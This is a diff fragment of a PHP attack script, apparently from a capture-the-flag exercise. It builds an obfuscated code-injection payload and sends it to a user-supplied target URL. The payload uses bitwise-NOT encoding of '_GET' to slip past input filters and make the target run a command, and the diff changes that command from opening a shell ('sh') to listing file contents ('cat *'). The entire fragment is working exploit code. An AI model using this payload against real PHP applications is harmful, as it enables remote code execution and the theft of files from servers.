@@ -2,7 +2,7 @@
 if (isset($_GET['target'])) {
   $payload = ~'_GET';
 
-  $payloadToSend = '${~'.$payload.'}{0}(\'sh\')';
+  $payloadToSend = '${~'.$payload.'}{0}(\'cat *\')';
 
 
   $targetUrl = $_GET['target'] . '?code=' . urlencode($payloadToSend);
